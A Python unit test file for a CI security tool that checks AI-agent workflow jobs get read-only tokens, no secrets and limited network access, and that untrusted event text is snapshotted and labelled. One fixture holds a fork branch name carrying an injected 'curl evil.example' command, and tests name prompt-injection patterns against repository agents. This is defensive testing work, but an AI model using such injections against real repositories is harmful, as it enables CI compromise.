"""FR7: run agents at the trust level of their inputs.

Acceptance criterion: an agent started by an outside event reads that event
only from a snapshot whose digests are recorded before its authority is set,
and gets a read-only token, no secrets, no cloud credentials, and network
access only to its model endpoint.
"""

import json
import unittest

from helpers import FIXTURES, RISKY, TempDir, run_cli, template_workflow

from obaaf import checker
from obaaf.attest import snapshot
from obaaf.attest.common import RecordError, sha256_file


class AgentLaneTemplateTest(unittest.TestCase):
    def setUp(self):
        self.wf = template_workflow("obaaf-agent-propose.yml")
        self.agent = self.wf.jobs["agent"]

    def test_agent_job_is_read_only_with_no_oidc(self):
        perms = self.agent.permissions
        self.assertEqual(perms.scopes, {"contents": "read"})
        self.assertFalse(perms.oidc)
        self.assertEqual(perms.write_scopes(), [])

    def test_agent_job_has_no_secrets_environment_or_cache(self):
        self.assertEqual(self.agent.secret_names(), set())
        self.assertIsNone(self.agent.environment)
        self.assertEqual(self.agent.cache_mode, "none")

    def test_agent_job_declares_its_egress_policy_and_runs_on_a_fresh_machine(self):
        self.assertIn("inference proxy", self.agent.env["OBAAF_EGRESS"])
        self.assertFalse(self.agent.self_hosted)

    def test_snapshot_is_taken_in_a_separate_job_before_the_agent(self):
        self.assertEqual(self.agent.needs, ["snapshot"])
        snap = self.wf.jobs["snapshot"]
        self.assertTrue(any("obaaf snapshot" in s.run for s in snap.steps))
        self.assertIn("snapshot-digest", snap.raw["outputs"])
        # The attest job checks the snapshot against the digest the agent job cannot change.
        attest = self.wf.jobs["attest"]
        self.assertTrue(any("needs.snapshot.outputs.snapshot-digest" in str(s.env) for s in attest.steps))

    def test_untrusted_text_never_enters_a_script(self):
        result = checker.check(self.wf_path())
        self.assertFalse([f for f in result.findings if f.rule == "OBAAF-GHA-010"])

    def wf_path(self):
        from helpers import TEMPLATES

        return TEMPLATES / "workflows" / "obaaf-agent-propose.yml"


class SnapshotTest(unittest.TestCase):
    def test_outsider_text_is_labeled_public_and_bounds_the_run(self):
        with TempDir() as tmp:
            record = snapshot.take(FIXTURES / "events" / "issue_comment.json", "issue_comment", tmp,
                                   repository="studio/game", visibility="public",
                                   roles={"maintainer": "admin", "outsider": "read"})
            labels = {i["name"]: i["label"] for i in record["inputs"]}
            self.assertEqual(labels["comment.body"], "Maintainer")
            self.assertEqual(labels["issue.body"], "Public")
            self.assertEqual(record["integrityLevel"], "Public")
            self.assertEqual(record["trigger"]["number"], 42)
            for item in record["inputs"]:
                self.assertEqual(sha256_file(tmp / item["path"]), item["digest"]["sha256"])

    def test_public_repository_floor_is_public_even_for_maintainer_text(self):
        with TempDir() as tmp:
            record = snapshot.take(FIXTURES / "events" / "issue_comment.json", "issue_comment", tmp,
                                   visibility="public", roles={"maintainer": "admin", "outsider": "admin"})
            self.assertEqual(record["floor"]["label"], "Public")
            self.assertEqual(record["integrityLevel"], "Public")

    def test_private_repository_floor_is_public_unless_raised(self):
        # Without a floor the snapshot cannot know who else wrote what the token can read.
        with TempDir() as tmp:
            record = snapshot.take(FIXTURES / "events" / "issues_labeled_private.json", "issues", tmp / "a",
                                   visibility="private", roles={"designer": "write", "lead": "maintain"})
            self.assertEqual(record["floor"]["label"], "Public")
            self.assertEqual(record["integrityLevel"], "Public")
            record = snapshot.take(FIXTURES / "events" / "issues_labeled_private.json", "issues", tmp / "b",
                                   visibility="private", roles={"designer": "write", "lead": "maintain"},
                                   floor="Contributor")
            self.assertEqual(record["integrityLevel"], "Contributor")
            self.assertIn("--floor Contributor", record["floor"]["reason"])

    def test_membership_alone_does_not_raise_a_label(self):
        # Without a permission lookup, MEMBER and COLLABORATOR say nothing about write access.
        labeler = snapshot.Labeler()
        self.assertEqual(labeler.principal("someone", "MEMBER").level, "Public")
        self.assertEqual(labeler.principal("someone", "COLLABORATOR").level, "Public")
        self.assertEqual(labeler.principal("owner", "OWNER").level, "Maintainer")
        self.assertEqual(snapshot.Labeler({"someone": "write"}).principal("someone", "MEMBER").level, "Contributor")

    def test_branch_names_from_forks_are_public(self):
        with TempDir() as tmp:
            record = snapshot.take(FIXTURES / "events" / "pull_request_target.json", "pull_request_target", tmp,
                                   roles={"contributor": "write"})
            labels = {i["name"]: i["label"] for i in record["inputs"]}
            self.assertEqual(labels["pull_request.head.ref"], "Public")
            # The branch name is stored as data, byte for byte.
            head = next(i for i in record["inputs"] if i["name"] == "pull_request.head.ref")
            self.assertIn("curl evil.example", (tmp / head["path"]).read_text())

    def test_without_role_lookups_author_association_is_used(self):
        with TempDir() as tmp:
            record = snapshot.take(FIXTURES / "events" / "issue_comment.json", "issue_comment", tmp)
            sources = {i["name"]: i["labelSource"] for i in record["inputs"]}
            self.assertIn("author_association", sources["comment.body"])

    def test_text_edited_after_the_snapshot_is_detected(self):
        with TempDir() as tmp:
            snapshot.take(FIXTURES / "events" / "issue_comment.json", "issue_comment", tmp)
            digest = snapshot.digest(tmp)
            snapshot.verify(tmp, digest)
            body = next(tmp.glob("inputs/*issue.body*"))
            body.write_text("edited after authority was decided", encoding="utf-8")
            with self.assertRaises(RecordError):
                snapshot.verify(tmp, digest)

    def test_replaced_snapshot_record_is_detected(self):
        with TempDir() as tmp:
            snapshot.take(FIXTURES / "events" / "issue_comment.json", "issue_comment", tmp)
            digest = snapshot.digest(tmp)
            data = json.loads((tmp / "snapshot.json").read_text())
            data["integrityLevel"] = "Maintainer"
            (tmp / "snapshot.json").write_text(json.dumps(data))
            with self.assertRaises(RecordError):
                snapshot.verify(tmp, digest)

    def test_cli_writes_github_outputs(self):
        import os

        with TempDir() as tmp:
            out_file = tmp / "github_output"
            os.environ["GITHUB_OUTPUT"] = str(out_file)
            try:
                code, out, err = run_cli("snapshot", "--event", FIXTURES / "events" / "issue_comment.json",
                                         "--event-name", "issue_comment", "--out", tmp / "snap", "--role",
                                         "maintainer=admin", "--role", "outsider=read")
            finally:
                del os.environ["GITHUB_OUTPUT"]
            self.assertEqual(code, 0, err)
            outputs = dict(line.split("=", 1) for line in out_file.read_text().splitlines())
            self.assertEqual(outputs["integrity-level"], "Public")
            self.assertEqual(outputs["snapshot-digest"], snapshot.digest(tmp / "snap"))


class CheckerCatchesFr7ViolationsTest(unittest.TestCase):
    def test_promptpwnd_pattern(self):
        rules = {f.rule for f in checker.check(RISKY / "promptpwnd-issue-agent.yml").findings}
        self.assertTrue({"OBAAF-GHA-003", "OBAAF-GHA-004", "OBAAF-GHA-005", "OBAAF-GHA-020"} <= rules)

    def test_persisted_token_in_agent_job(self):
        rules = {f.rule for f in checker.check(RISKY / "claude-action-toctou.yml").findings}
        self.assertIn("OBAAF-GHA-011", rules)


if __name__ == "__main__":
    unittest.main()
